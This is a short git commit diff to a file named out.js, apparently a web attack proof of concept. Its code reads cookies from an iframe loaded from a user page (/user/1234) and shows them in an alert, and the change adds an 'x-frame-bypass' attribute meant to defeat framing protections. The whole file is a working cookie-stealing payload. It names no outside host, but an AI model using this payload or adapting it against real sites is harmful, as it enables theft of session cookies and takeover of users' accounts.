3abd9e4719073b145813f72231e26d33da0a2a97
temprepreoreor <91982573+temprepreoreor@users.noreply.github.com>
2021-10-10 06:24:17 +0900

    Update out.js

--- out.js
+++ out.js
@@ -2,4 +2,4 @@ function bru() {
  var cookies = document.getElementById('f').contentDocument.cookie;
  alert(cookies);
 };
-document.write('<iframe id="f" onload="bru()" src="/user/1234" ></iframe>');
+document.write('<iframe id="f" is="x-frame-bypass" onload="bru()" src="/user/1234" ></iframe>');
